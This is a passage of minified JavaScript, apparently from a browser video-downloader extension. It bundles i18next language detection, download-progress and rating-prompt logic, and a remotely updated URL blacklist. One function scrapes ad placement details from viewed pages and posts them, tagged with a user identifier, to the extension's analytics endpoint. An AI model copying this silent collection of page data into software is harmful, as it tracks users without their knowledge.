                                var lng = this.languages[0],
                                    fallbackLng = !!this.options && this.options.fallbackLng,
                                    lastLng = this.languages[this.languages.length - 1];
                                if ("cimode" === lng.toLowerCase()) return !0;
                                var loadNotPending = function (l, n) {
                                    var loadState = _this6.services.backendConnector.state["".concat(l, "|").concat(n)];
                                    return -1 === loadState || 2 === loadState;
                                };
                                if (options.precheck) {
                                    var preResult = options.precheck(this, loadNotPending);
                                    if (void 0 !== preResult) return preResult;
                                }
                                return !!this.hasResourceBundle(lng, ns) || !this.services.backendConnector.backend || !(!loadNotPending(lng, ns) || (fallbackLng && !loadNotPending(lastLng, ns)));
                            },
                        },
                        {
                            key: "loadNamespaces",
                            value: function (ns, callback) {
                                var _this7 = this,
                                    deferred = defer();
                                return this.options.ns
                                    ? ("string" == typeof ns && (ns = [ns]),
                                      ns.forEach(function (n) {
                                          _this7.options.ns.indexOf(n) < 0 && _this7.options.ns.push(n);
                                      }),
                                      this.loadResources(function (err) {
                                          deferred.resolve(), callback && callback(err);
                                      }),
                                      deferred)
                                    : (callback && callback(), Promise.resolve());
                            },
                        },
                        {
                            key: "loadLanguages",
                            value: function (lngs, callback) {
                                var deferred = defer();
                                "string" == typeof lngs && (lngs = [lngs]);
                                var preloaded = this.options.preload || [],
                                    newLngs = lngs.filter(function (lng) {
                                        return preloaded.indexOf(lng) < 0;
                                    });
                                return newLngs.length
                                    ? ((this.options.preload = preloaded.concat(newLngs)),
                                      this.loadResources(function (err) {
                                          deferred.resolve(), callback && callback(err);
                                      }),
                                      deferred)
                                    : (callback && callback(), Promise.resolve());
                            },
                        },
                        {
                            key: "dir",
                            value: function (lng) {
                                if ((lng || (lng = this.languages && this.languages.length > 0 ? this.languages[0] : this.language), !lng)) return "rtl";
                                return [
                                    "ar",
                                    "shu",
                                    "sqr",
                                    "ssh",
                                    "xaa",
                                    "yhd",
                                    "yud",
                                    "aao",
                                    "abh",
                                    "abv",
                                    "acm",
                                    "acq",
                                    "acw",
                                    "acx",
                                    "acy",
                                    "adf",
                                    "ads",
                                    "aeb",
                                    "aec",
                                    "afb",
                                    "ajp",
                                    "apc",
                                    "apd",
                                    "arb",
                                    "arq",
                                    "ars",
                                    "ary",
                                    "arz",
                                    "auz",
                                    "avl",
                                    "ayh",
                                    "ayl",
                                    "ayn",
                                    "ayp",
                                    "bbz",
                                    "pga",
                                    "he",
                                    "iw",
                                    "ps",
                                    "pbt",
                                    "pbu",
                                    "pst",
                                    "prp",
                                    "prd",
                                    "ug",
                                    "ur",
                                    "ydd",
                                    "yds",
                                    "yih",
                                    "ji",
                                    "yi",
                                    "hbo",
                                    "men",
                                    "xmn",
                                    "fa",
                                    "jpr",
                                    "peo",
                                    "pes",
                                    "prs",
                                    "dv",
                                    "sam",
                                ].indexOf(this.services.languageUtils.getLanguagePartFromCode(lng)) >= 0
                                    ? "rtl"
                                    : "ltr";
                            },
                        },
                        {
                            key: "createInstance",
                            value: function () {
                                var options = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
                                    callback = arguments.length > 1 ? arguments[1] : void 0;
                                return new I18n(options, callback);
                            },
                        },
                        {
                            key: "cloneInstance",
                            value: function () {
                                var _this8 = this,
                                    options = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
                                    callback = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : i18next_noop,
                                    mergedOptions = objectSpread_objectSpread({}, this.options, options, { isClone: !0 }),
                                    clone = new I18n(mergedOptions),
                                    membersToCopy = ["store", "services", "language"];
                                return (
                                    membersToCopy.forEach(function (m) {
                                        clone[m] = _this8[m];
                                    }),
                                    (clone.services = objectSpread_objectSpread({}, this.services)),
                                    (clone.services.utils = { hasLoadedNamespace: clone.hasLoadedNamespace.bind(clone) }),
                                    (clone.translator = new i18next_Translator(clone.services, clone.options)),
                                    clone.translator.on("*", function (event) {
                                        for (var _len4 = arguments.length, args = new Array(_len4 > 1 ? _len4 - 1 : 0), _key4 = 1; _key4 < _len4; _key4++) args[_key4 - 1] = arguments[_key4];
                                        clone.emit.apply(clone, [event].concat(args));
                                    }),
                                    clone.init(mergedOptions, callback),
                                    (clone.translator.options = clone.options),
                                    (clone.translator.backendConnector.services.utils = { hasLoadedNamespace: clone.hasLoadedNamespace.bind(clone) }),
                                    clone
                                );
                            },
                        },
                    ]),
                    I18n
                );
            })(i18next_EventEmitter))(),
            i18nextBrowserLanguageDetector_arr = [],
            each = i18nextBrowserLanguageDetector_arr.forEach,
            slice = i18nextBrowserLanguageDetector_arr.slice;
        function i18nextBrowserLanguageDetector_defaults(obj) {
            return (
                each.call(slice.call(arguments, 1), function (source) {
                    if (source) for (var prop in source) void 0 === obj[prop] && (obj[prop] = source[prop]);
                }),
                obj
            );
        }
        var fieldContentRegExp = /^[\u0009\u0020-\u007e\u0080-\u00ff]+$/,
            serializeCookie = function (name, val, options) {
                var opt = options || {};
                opt.path = opt.path || "/";
                var str = name + "=" + encodeURIComponent(val);
                if (opt.maxAge > 0) {
                    var maxAge = opt.maxAge - 0;
                    if (isNaN(maxAge)) throw new Error("maxAge should be a Number");
                    str += "; Max-Age=" + Math.floor(maxAge);
                }
                if (opt.domain) {
                    if (!fieldContentRegExp.test(opt.domain)) throw new TypeError("option domain is invalid");
                    str += "; Domain=" + opt.domain;
                }
                if (opt.path) {
                    if (!fieldContentRegExp.test(opt.path)) throw new TypeError("option path is invalid");
                    str += "; Path=" + opt.path;
                }
                if (opt.expires) {
                    if ("function" != typeof opt.expires.toUTCString) throw new TypeError("option expires is invalid");
                    str += "; Expires=" + opt.expires.toUTCString();
                }
                if ((opt.httpOnly && (str += "; HttpOnly"), opt.secure && (str += "; Secure"), opt.sameSite))
                    switch ("string" == typeof opt.sameSite ? opt.sameSite.toLowerCase() : opt.sameSite) {
                        case !0:
                            str += "; SameSite=Strict";
                            break;
                        case "lax":
                            str += "; SameSite=Lax";
                            break;
                        case "strict":
                            str += "; SameSite=Strict";
                            break;
                        case "none":
                            str += "; SameSite=None";
                            break;
                        default:
                            throw new TypeError("option sameSite is invalid");
                    }
                return str;
            },
            cookie_create = function (name, value, minutes, domain) {
                var cookieOptions = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : { path: "/", sameSite: "strict" };
                minutes && ((cookieOptions.expires = new Date()), cookieOptions.expires.setTime(cookieOptions.expires.getTime() + 60 * minutes * 1e3)),
                    domain && (cookieOptions.domain = domain),
                    (document.cookie = serializeCookie(name, encodeURIComponent(value), cookieOptions));
            },
            cookie_read = function (name) {
                for (var nameEQ = name + "=", ca = document.cookie.split(";"), i = 0; i < ca.length; i++) {
                    for (var c = ca[i]; " " === c.charAt(0); ) c = c.substring(1, c.length);
                    if (0 === c.indexOf(nameEQ)) return c.substring(nameEQ.length, c.length);
                }
                return null;
            },
            cookie$1 = {
                name: "cookie",
                lookup: function (options) {
                    var found;
                    if (options.lookupCookie && "undefined" != typeof document) {
                        var c = cookie_read(options.lookupCookie);
                        c && (found = c);
                    }
                    return found;
                },
                cacheUserLanguage: function (lng, options) {
                    options.lookupCookie && "undefined" != typeof document && cookie_create(options.lookupCookie, lng, options.cookieMinutes, options.cookieDomain, options.cookieOptions);
                },
            },
            querystring = {
                name: "querystring",
                lookup: function (options) {
                    var found;
                    if ("undefined" != typeof window)
                        for (var params = window.location.search.substring(1).split("&"), i = 0; i < params.length; i++) {
                            var pos = params[i].indexOf("=");
                            if (pos > 0) params[i].substring(0, pos) === options.lookupQuerystring && (found = params[i].substring(pos + 1));
                        }
                    return found;
                },
            },
            hasLocalStorageSupport = null,
            localStorageAvailable = function () {
                if (null !== hasLocalStorageSupport) return hasLocalStorageSupport;
                try {
                    hasLocalStorageSupport = "undefined" !== window && null !== window.localStorage;
                    window.localStorage.setItem("i18next.translate.boo", "foo"), window.localStorage.removeItem("i18next.translate.boo");
                } catch (e) {
                    hasLocalStorageSupport = !1;
                }
                return hasLocalStorageSupport;
            },
            localStorage = {
                name: "localStorage",
                lookup: function (options) {
                    var found;
                    if (options.lookupLocalStorage && localStorageAvailable()) {
                        var lng = window.localStorage.getItem(options.lookupLocalStorage);
                        lng && (found = lng);
                    }
                    return found;
                },
                cacheUserLanguage: function (lng, options) {
                    options.lookupLocalStorage && localStorageAvailable() && window.localStorage.setItem(options.lookupLocalStorage, lng);
                },
            },
            hasSessionStorageSupport = null,
            sessionStorageAvailable = function () {
                if (null !== hasSessionStorageSupport) return hasSessionStorageSupport;
                try {
                    hasSessionStorageSupport = "undefined" !== window && null !== window.sessionStorage;
                    window.sessionStorage.setItem("i18next.translate.boo", "foo"), window.sessionStorage.removeItem("i18next.translate.boo");
                } catch (e) {
                    hasSessionStorageSupport = !1;
                }
                return hasSessionStorageSupport;
            },
            sessionStorage = {
                name: "sessionStorage",
                lookup: function (options) {
                    var found;
                    if (options.lookupSessionStorage && sessionStorageAvailable()) {
                        var lng = window.sessionStorage.getItem(options.lookupSessionStorage);
                        lng && (found = lng);
                    }
                    return found;
                },
                cacheUserLanguage: function (lng, options) {
                    options.lookupSessionStorage && sessionStorageAvailable() && window.sessionStorage.setItem(options.lookupSessionStorage, lng);
                },
            },
            navigator$1 = {
                name: "navigator",
                lookup: function (options) {
                    var found = [];
                    if ("undefined" != typeof navigator) {
                        if (navigator.languages) for (var i = 0; i < navigator.languages.length; i++) found.push(navigator.languages[i]);
                        navigator.userLanguage && found.push(navigator.userLanguage), navigator.language && found.push(navigator.language);
                    }
                    return found.length > 0 ? found : void 0;
                },
            },
            htmlTag = {
                name: "htmlTag",
                lookup: function (options) {
                    var found,
                        htmlTag = options.htmlTag || ("undefined" != typeof document ? document.documentElement : null);
                    return htmlTag && "function" == typeof htmlTag.getAttribute && (found = htmlTag.getAttribute("lang")), found;
                },
            },
            i18nextBrowserLanguageDetector_path = {
                name: "path",
                lookup: function (options) {
                    var found;
                    if ("undefined" != typeof window) {
                        var language = window.location.pathname.match(/\/([a-zA-Z-]*)/g);
                        if (language instanceof Array)
                            if ("number" == typeof options.lookupFromPathIndex) {
                                if ("string" != typeof language[options.lookupFromPathIndex]) return;
                                found = language[options.lookupFromPathIndex].replace("/", "");
                            } else found = language[0].replace("/", "");
                    }
                    return found;
                },
            },
            subdomain = {
                name: "subdomain",
                lookup: function (options) {
                    var found;
                    if ("undefined" != typeof window) {
                        var language = window.location.href.match(/(?:http[s]*\:\/\/)*(.*?)\.(?=[^\/]*\..{2,5})/gi);
                        language instanceof Array &&
                            (found =
                                "number" == typeof options.lookupFromSubdomainIndex
                                    ? language[options.lookupFromSubdomainIndex].replace("http://", "").replace("https://", "").replace(".", "")
                                    : language[0].replace("http://", "").replace("https://", "").replace(".", ""));
                    }
                    return found;
                },
            };
        var i18nextBrowserLanguageDetector_Browser = (function () {
            function Browser(services) {
                var options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                _classCallCheck(this, Browser), (this.type = "languageDetector"), (this.detectors = {}), this.init(services, options);
            }
            return (
                _createClass(Browser, [
                    {
                        key: "init",
                        value: function (services) {
                            var options = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
                                i18nOptions = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                            (this.services = services),
                                (this.options = i18nextBrowserLanguageDetector_defaults(options, this.options || {}, {
                                    order: ["querystring", "cookie", "localStorage", "sessionStorage", "navigator", "htmlTag"],
                                    lookupQuerystring: "lng",
                                    lookupCookie: "i18next",
                                    lookupLocalStorage: "i18nextLng",
                                    lookupSessionStorage: "i18nextLng",
                                    caches: ["localStorage"],
                                    excludeCacheFor: ["cimode"],
                                })),
                                this.options.lookupFromUrlIndex && (this.options.lookupFromPathIndex = this.options.lookupFromUrlIndex),
                                (this.i18nOptions = i18nOptions),
                                this.addDetector(cookie$1),
                                this.addDetector(querystring),
                                this.addDetector(localStorage),
                                this.addDetector(sessionStorage),
                                this.addDetector(navigator$1),
                                this.addDetector(htmlTag),
                                this.addDetector(i18nextBrowserLanguageDetector_path),
                                this.addDetector(subdomain);
                        },
                    },
                    {
                        key: "addDetector",
                        value: function (detector) {
                            this.detectors[detector.name] = detector;
                        },
                    },
                    {
                        key: "detect",
                        value: function (detectionOrder) {
                            var _this = this;
                            detectionOrder || (detectionOrder = this.options.order);
                            var detected = [];
                            return (
                                detectionOrder.forEach(function (detectorName) {
                                    if (_this.detectors[detectorName]) {
                                        var lookup = _this.detectors[detectorName].lookup(_this.options);
                                        lookup && "string" == typeof lookup && (lookup = [lookup]), lookup && (detected = detected.concat(lookup));
                                    }
                                }),
                                this.services.languageUtils.getBestMatchFromCodes ? detected : detected.length > 0 ? detected[0] : null
                            );
                        },
                    },
                    {
                        key: "cacheUserLanguage",
                        value: function (lng, caches) {
                            var _this2 = this;
                            caches || (caches = this.options.caches),
                                caches &&
                                    ((this.options.excludeCacheFor && this.options.excludeCacheFor.indexOf(lng) > -1) ||
                                        caches.forEach(function (cacheName) {
                                            _this2.detectors[cacheName] && _this2.detectors[cacheName].cacheUserLanguage(lng, _this2.options);
                                        }));
                        },
                    },
                ]),
                Browser
            );
        })();
        i18nextBrowserLanguageDetector_Browser.type = "languageDetector";
        var i18nextBrowserLanguageDetector = i18nextBrowserLanguageDetector_Browser;
        const i18n_resources = {
            en: { translation: __webpack_require__(150) },
            es: { translation: __webpack_require__(151) },
            fr: { translation: __webpack_require__(152) },
            ru: { translation: __webpack_require__(153) },
            zh: { translation: __webpack_require__(154) },
        };
        var render_widget = (store) => async (Widget, widgetContainer) => {
            const { module: module, setTheme: setTheme } = store.getState();
            ((store) => {
                const { module: module, lang: lang, setDir: setDir, setI18N: setI18N } = store.getState(),
                    setLang = esm_i18next.changeLanguage.bind(esm_i18next),
                    getLang = () => {
                        const { lang: lang } = store.getState();
                        return lang;
                    };
                module.startLangObserver && module.startLangObserver(getLang, setLang),
                    setDir(module.getDir ? module.getDir() : "ltr"),
                    module.startDirObserver && module.startDirObserver(setDir),
                    esm_i18next
                        .use(initReactI18next)
                        .use(i18nextBrowserLanguageDetector)
                        .init({
                            compatibilityJSON: "v3",
                            transSupportBasicHtmlNodes: !0,
                            transKeepBasicHtmlNodesFor: ["b", "br"],
                            resources: i18n_resources,
                            fallbackLng: "en",
                            lng: "autoDetect" === lang ? module.getLang() : lang,
                            keySeparator: ".",
                            interpolation: { escapeValue: !1 },
                        }),
                    setI18N(esm_i18next);
            })(store),
                setTheme(module.getTheme ? module.getTheme() : "default"),
                module.startThemeObserver && module.startThemeObserver(setTheme),
                Object(react_dom.render)(react_default.a.createElement(components_Provider, { store: store }, react_default.a.createElement(Widget, null)), widgetContainer);
        };
        const sinceInstalled = 3 * day;
        const sinceLastNotNow = ((num) => 6048e5 * num)(2);
        var check_rating_modal = async (store) => {
            const { addModal: addModal, eventRouter: eventRouter } = store.getState();
            if ("userscript" === config.a.dist) return;
            const decision = await (async (store) => {
                console.log(store.getState());
                const {
                    ratingModalLastCheck: ratingModalLastCheck,
                    ratingModalNeverShow: ratingModalNeverShow,
                    lastNotNow: lastNotNow,
                    downloadedInRow: downloadedInRow,
                    screenshotsCount: screenshotsCount,
                    setRatingModalLastCheck: setRatingModalLastCheck,
                } = store.getState();
                if (ratingModalNeverShow) return "dontShow";
                const now = Date.now();
                if (now - ratingModalLastCheck < 6e4) return "dontShow";
                setRatingModalLastCheck(now);
                return now - (await index_ext.get("extensionInstalledStamp")) < sinceInstalled || (lastNotNow && now - lastNotNow < sinceLastNotNow)
                    ? "dontShow"
                    : downloadedInRow >= 10
                    ? "showDownloads"
                    : screenshotsCount >= 10
                    ? "showScreenshots"
                    : "dontShow";
            })(store);
            if ("dontShow" !== decision) {
                if ("showDownloads" === decision) {
                    const modalType = "askingForReviewByDownloads";
                    addModal({ type: "modal", modalType: modalType }), eventRouter.emit("showModal", modalType);
                }
                if ("showScreenshots" === decision) {
                    const modalType = "askingForReviewByScreenshots";
                    addModal({ type: "modal", modalType: modalType }), eventRouter.emit("showModal", modalType);
                }
            }
        };
        const cacheId = (id) => "cache_" + id,
            validateCache = async () => {
                (await index_ext.getAllKeys())
                    .filter((key) => key.startsWith("cache_"))
                    .forEach((key) =>
                        setTimeout(
                            () =>
                                (async (key) => {
                                    const value = await index_ext.get(key);
                                    value && value.expires && Date.now() / 1e3 > value.expires && index_ext.removeItem(key);
                                })(key),
                            0
                        )
                    );
            };
        let timeoutHandler,
            waitingInfo = !1;
        const resetTimeoutHandler = () => {
            timeoutHandler && (clearTimeout(timeoutHandler), (timeoutHandler = null));
        };
        var get_update_media_info = function (store) {
                const { setStatus: setStatus, setInfo: setInfo, setTitle: setTitle, setDefaultItem: setDefaultItem } = store.getState();
                return async function () {
                    if (waitingInfo) return;
                    waitingInfo = !0;
                    const { module: module, eventRouter: eventRouter, serviceName: serviceName } = store.getState(),
                        { getMediaInfo: getMediaInfo } = module;
                    if (!getMediaInfo) return void (waitingInfo = !1);
                    setStatus("gettingInfo"), setInfo(null), setDefaultItem(null), setTitle(null);
                    const { getMediaId: getMediaId, makeCanonicalUrl: makeCanonicalUrl } = module,
                        token = makeCanonicalUrl(getMediaId(window.location.href));
                    if (await (async (url, module) => (await index_ext.get("blackList")).some(((url) => (target) => url === target)(module.makeCanonicalUrl(module.getMediaId(url)))))(token, module))
                        return setStatus("protected"), void (waitingInfo = !1);
                    resetTimeoutHandler(),
                        (timeoutHandler = setTimeout(() => {
                            eventRouter.emit("updateInfo_failure", token);
                        }, 7e3));
                    const emitMediaInfo = (info) => {
                            resetTimeoutHandler(), (waitingInfo = !1);
                            const { raw: raw, mediaInfo: mediaInfo } = info;
                            raw ? eventRouter.emit("rawMediaInfo", { raw: raw, serviceName: serviceName }) : eventRouter.emit("mediaInfo", mediaInfo, token);
                        },
                        cached = await (async (id) => {
                            const info = await index_ext.get(cacheId(id));
                            return info && Date.now() / 1e3 < info.expires ? info : null;
                        })(token);
                    cached ? emitMediaInfo({ mediaInfo: cached }) : getMediaInfo(token, emitMediaInfo);
                };
            },
            set_media_info = (store, token, _mediaInfo) => {
                check_rating_modal(store);
                const {
                        info: info,
                        setStatus: setStatus,
                        setInfo: setInfo,
                        setTitle: setTitle,
                        setImgs: setImgs,
                        setDefaultItem: setDefaultItem,
                        sendEvent: sendEvent,
                        listMode: listMode,
                        setListMode: setListMode,
                        module: module,
                    } = store.getState(),
                    { getMediaId: getMediaId, makeCanonicalUrl: makeCanonicalUrl } = module;
                if (token !== makeCanonicalUrl(getMediaId(window.location.href))) return;
                if (_mediaInfo.status) return void setStatus(_mediaInfo.status);
                var data;
                (data = _mediaInfo), index_ext.set(cacheId(token), data), validateCache();
                const { downloader: downloader } = module,
                    mediaInfo = downloader
                        ? ((mediaInfo, downloader) => (
                              console.log("INJECT!!!", mediaInfo),
                              {
                                  ...mediaInfo,
                                  streams: mediaInfo.streams ? mediaInfo.streams.map((stream) => ({ ...stream, download: downloader.bind(stream) })) : [],
                                  video: mediaInfo.video ? mediaInfo.video.map((stream) => ({ ...stream, download: downloader.bind(stream) })) : [],
                                  audio: mediaInfo.audio ? mediaInfo.audio.map((stream) => ({ ...stream, download: downloader.bind(stream) })) : [],
                                  imgs: mediaInfo.imgs ? mediaInfo.imgs.map((img) => ({ ...img, download: downloader.bind(img) })) : [],
                              }
                          ))(_mediaInfo, downloader)
                        : _mediaInfo,
                    { title: title, canonicalUrl: canonicalUrl } = mediaInfo;
                setTitle(title);
                const refining = info && canonicalUrl === info.canonicalUrl,
                    status = get_default_status(mediaInfo);
                if ("imgDownloading" === status) {
                    setImgs(mediaInfo.imgs);
                    const imgMax = Math.max(...mediaInfo.imgs.map((img) => img.height));
                    if (imgMax) {
                        setDefaultItem(mediaInfo.imgs.find((img) => img.height === imgMax));
                    }
                    refining || sendEvent({ action: "button_img" });
                }
                "liveStream" === status && (refining || sendEvent({ action: "button_liveStream" })),
                    "premiere" === status && (refining || sendEvent({ action: "button_premiere" })),
                    setInfo(mediaInfo),
                    "idle" === status && (setListMode(["short", "full"].includes(listMode) ? "short" : "embed"), refining || sendEvent({ action: "button_normal" })),
                    refining || sendEvent({ action: "updateInfo_success" });
            };
        const getField = (obj, fieldPath, relative = {}) => {
                const path = fieldPath.split(".");
                let key = path.shift();
                const rel = ((key || "").match(/^%(.+)%$/) || [])[1];
                let result = rel ? relative[rel] : obj[key];
                for (; result && (key = path.shift()) && (result = result[key]); );
                return result;
            },
            helpers = {
                filterObj: (obj, cb) => Object.entries(obj).reduce((result, [key, val]) => (cb(key, val) && (result[key] = val), result), {}),
                gv: {
                    strs: { flyoutCta: "playerOverlay.instreamAdPlayerOverlayRenderer.flyoutCtaRenderer.flyoutCtaRenderer", microformatRender: "%_playerVars%.player_response.microformat.playerMicroformatRenderer" },
                    maxThumb: (list) => {
                        if (list.url) return list.url;
                        if (Array.isArray(list)) {
                            list.filter((t) => !!t.url).sort((a, b) => {
                                const as = Math.max(a.height || 0, a.width || 0),
                                    bs = Math.max(b.height || 0, b.width || 0);
                                return as > bs ? -1 : as < bs ? 1 : 0;
                            });
                            return (list.shift() || {}).url;
                        }
                        return list;
                    },
                    trgUrl: (url) => {
                        const sp = url.split("?").pop();
                        return new URLSearchParams(sp).get("adurl") || url;
                    },
                },
            },
            preprocess = {
                matchSchemas: (obj, type) => {
                    const available = preprocess.schemas[type];
                    return Object.entries(available)
                        .map(([key, schema]) => {
                            const val = schema._path ? getField(obj, schema._path) : obj[key];
                            if (!val) return !1;
                            const target = schema._get ? schema._get(val) : val;
                            return { schema: schema, target: target };
                        })
                        .filter((r) => r);
                },
                parse: (obj, type = "gv") =>
                    preprocess.matchSchemas(obj, type).map(({ schema: _schema, target: target }) => {
                        const { _type: _type, _path: _path, _get: _get, ...schema } = _schema,
                            result = { type: _type };
                        return Object.keys(schema).length < 1 && (target || {}).parsed
                            ? { type: _type, items: target.parsed }
                            : (Object.entries(schema).forEach(([key, rule]) => {
                                  result[key] = ((rule) => {
                                      const path = ((rule) => ("string" == typeof rule ? rule : rule.path))(rule);
                                      if (!path) return;
                                      let val = getField(target, path, result);
                                      return val && rule.get && (val = rule.get(val)), val;
                                  })(rule);
                              }),
                              helpers.filterObj(result, (key) => /^[^_]/.test(key)));
                    }),
                flatten: (parsed) => {
                    const canFlaten = (a) => Array.isArray(a) && a.every((i) => Array.isArray(i)),
                        flaten = (arr) => (canFlaten(arr) ? [].concat(...arr) : arr).map((i) => (canFlaten(i) ? flaten(i) : i));
                    return flaten(parsed);
                },
                schemas: {
                    gv: {
                        actionCompanionAdRenderer: {
                            _type: "act-companion",
                            _path: "adPlacementRenderer.renderer.actionCompanionAdRenderer",
                            title: "headline.text",
                            description: "description.text",
                            videoId: "adVideoId",
                            url: { path: "navigationEndpoint.urlEndpoint.url", get: helpers.gv.trgUrl },
                            actionButton: "actionButton.buttonRenderer.text.simpleText",
                            actionButtonUrl: { path: "actionButton.buttonRenderer.navigationEndpoint.urlEndpoint.url", get: helpers.gv.trgUrl },
                            iconImage: { path: "iconImage.thumbnail.thumbnails", get: helpers.gv.maxThumb },
                            bannerImage: { path: "bannerImage.thumbnail.thumbnails", get: helpers.gv.maxThumb },
                        },
                        linearAdSequenceRenderer: {
                            _type: "linear-sequence",
                            _path: "adPlacementRenderer.renderer.linearAdSequenceRenderer.linearAds",
                            _get: (list) => {
                                const parsed = list.map((ad) => preprocess.parse(ad, "gv"));
                                return { parsed: preprocess.flatten(parsed) };
                            },
                        },
                        instreamVideoAdRenderer: {
                            _type: "instream-video",
                            url: { path: helpers.gv.strs.flyoutCta + ".actionButton.buttonRenderer.navigationEndpoint.urlEndpoint.url", get: helpers.gv.trgUrl },
                            adDescription: helpers.gv.strs.flyoutCta + ".description.text",
                            adTitle: helpers.gv.strs.flyoutCta + ".headline.text",
                            adImage: { path: helpers.gv.strs.flyoutCta + ".image.thumbnail.thumbnails", get: helpers.gv.maxThumb },
                            _playerVars: {
                                path: "playerVars",
                                get: (raw) => {
                                    const p = new URLSearchParams(raw),
                                        obj = {};
                                    for (const [key, value] of p.entries()) obj[key] = value;
                                    return (obj.player_response = JSON.parse(obj.player_response || "{}")), obj;
                                },
                            },
                            videoId: "%_playerVars%.video_id",
                            category: helpers.gv.strs.microformatRender + ".category",
                            description: helpers.gv.strs.microformatRender + ".description.simpleText",
                            videoUrl: helpers.gv.strs.microformatRender + ".embed.flashSecureUrl",
                            owner: helpers.gv.strs.microformatRender + ".ownerChannelName",
                            ownerUrl: helpers.gv.strs.microformatRender + ".ownerProfileUrl",
                            image: { path: helpers.gv.strs.microformatRender + ".thumbnail.thumbnails", get: helpers.gv.maxThumb },
                            title: helpers.gv.strs.microformatRender + ".title.simpleText",
                            uploadDate: helpers.gv.strs.microformatRender + ".uploadDate",
                        },
                        adActionInterstitialRenderer: {
                            _type: "act-interstitial",
                            title: "headline.text",
                            description: "description.text",
                            url: { path: "navigationEndpoint.urlEndpoint.url", get: helpers.gv.trgUrl },
                            image: { path: "image.thumbnail.thumbnails", get: helpers.gv.maxThumb },
                            background: { path: "background.thumbnail.thumbnails", get: helpers.gv.maxThumb },
                            backgroundImage: { path: "backgroundImage.thumbnail.thumbnails", get: helpers.gv.maxThumb },
                            actionButton: "actionButton.buttonRenderer.text.simpleText",
                            actionButtonUrl: { path: "actionButton.buttonRenderer.navigationEndpoint.urlEndpoint.url", get: helpers.gv.trgUrl },
                            skipButton: "skipButton.skipButtonRenderer.message.text",
                        },
                    },
                },
                parsers: {
                    gv: {
                        parseInitial: ({ adPlacements: adPlacements }) => {
                            if (!adPlacements) return null;
                            const ads = adPlacements.map((adPlacement) => preprocess.parse(adPlacement, "gv")).filter((a) => a.length > 0);
                            return preprocess.flatten(ads);
                        },
                    },
                },
                handleData: (type, data) => {
                    try {
                        switch (type) {
                            case "gv":
                                return preprocess.parsers.gv.parseInitial(data);
                            default:
                                return null;
                        }
                    } catch (e) {
                        return { error: "preprocess", type: type };
                    }
                },
            };
        var send_mk_data = async ({ serviceName: serviceName, raw: raw }, store) => {
            const { hid: hid, utm: utm } = store.getState(),
                defData = { version: config.a.version, type: config.a.analyticsType, project: config.a.type, branch: config.a.branch, action: "mk-data", hid: hid, hash: config.a.hash, ...utm, service: serviceName },
                processed = preprocess.handleData(serviceName, raw);
            if (processed && !(processed.length < 1))
                try {
                    const headers = [["Content-Type", "application/json; charset=utf-8"]],
                        body = JSON.stringify({ ...defData, info: processed });
                    network_sendPost(config.a.analyticsUrl, headers, body, !0);
                } catch (e) {}
        };
        const update_black_list_modules = integration_modules(),
            checkers = Object.keys(update_black_list_modules).map((moduleName) => {
                const { isServiceMediaUrl: isServiceMediaUrl, getMediaId: getMediaId, makeCanonicalUrl: makeCanonicalUrl } = update_black_list_modules[moduleName];
                return { isServiceMediaUrl: isServiceMediaUrl, getMediaId: getMediaId, makeCanonicalUrl: makeCanonicalUrl };
            }),
            onlyRecognisable = (url) => checkers.some((checker) => checker.isServiceMediaUrl && checker.isServiceMediaUrl(url)),
            makeCanonical = (url) => {
                const targetChecker = checkers.find((checker) => checker.isServiceMediaUrl && checker.isServiceMediaUrl(url));
                return targetChecker && targetChecker.makeCanonicalUrl(targetChecker.getMediaId(url));
            },
            update_black_list_onlyUniques = (value, index, self) => self.indexOf(value) === index;
        var update_black_list = () =>
                new Promise(async (resolve, reject) => {
                    if ((await index_ext.get("blackListLastUpdated")) + ((num) => 36e5 * num)(6) > Date.now()) return void resolve();
                    const getPage = (pageNum) => {
                        const url = `${config.a.getBlackListEndpoint}/?page=${pageNum}`;
                        fetchBack(url, { method: "GET" })
                            .then((response) => {
                                const { urls: urls, totalPages: totalPages } = response;
                                (async (urls) => {
                                    const newList = [...(await index_ext.get("blackList")), ...urls.filter(onlyRecognisable).map(makeCanonical)].filter(update_black_list_onlyUniques);
                                    await index_ext.set("blackList", newList);
                                })(urls).then(() => {
                                    totalPages > pageNum ? getPage(pageNum + 1) : (index_ext.set("blackListLastUpdated", Date.now()), resolve());
                                });
                            })
                            .catch(reject);
                    };
                    getPage(1);
                }),
            set_events_listeners_index_ext = (eventRouter, store, sendDumpHandler, handlers) => {
                const { setProgress: setProgress, setCurrentSpeed: setCurrentSpeed, setAverageSpeed: setAverageSpeed, setContentLength: setContentLength, setAlreadyDownloaded: setAlreadyDownloaded } = store.getState();
                let downloadPlan;
                eventRouter.on("startDownloading", (item, serviceName) => {
                    const { stats: stats } = store.getState();
                    downloadPlan = { chunks: {}, length: media_content_length(item), conversionMode: media_conversion_mode(item), url: item.url, serviceName: serviceName, muxed: 0, downloadStarted: Date.now() };
                    const currentStat = stats[serviceName].download,
                        averageSpeed = (currentStat.mb / currentStat.seconds) * 1024 * 1024;
                    setAverageSpeed(averageSpeed), setContentLength(downloadPlan.length);
                });
                const getDownloaded = (plan) => Object.keys(plan.chunks).reduce((length, chunkName) => length + plan.chunks[chunkName], 0),
                    calculateAndSetProgress = (plan) => {
                        if (!plan) return;
                        const { stats: stats } = store.getState(),
                            progress = ((plan) => (getDownloaded(plan) / plan.length) * 100)(plan),
                            downloaded = getDownloaded(plan),
                            speed = downloaded / ((Date.now() - plan.downloadStarted) / 1e3);
                        if ((setCurrentSpeed(speed), setAlreadyDownloaded(downloaded), "download" === plan.conversionMode)) setProgress(progress);
                        else {
                            const refinedProgress = ((progress, mode, weights) => {
                                const { download: download, converting: converting } = weights[mode] || { download: 1, converting: 1 },
                                    downloadK = (download / (download + converting)) * 2;
                                return progress <= 50 ? progress * downloadK : 50 * downloadK + (progress - 50) * ((converting / (download + converting)) * 2);
                            })(progress / 2 + plan.muxed / 2, downloadPlan.conversionMode, stats[plan.serviceName]);
                            setProgress(refinedProgress);
                        }
                    };
                eventRouter.on("progress", (evt) => {
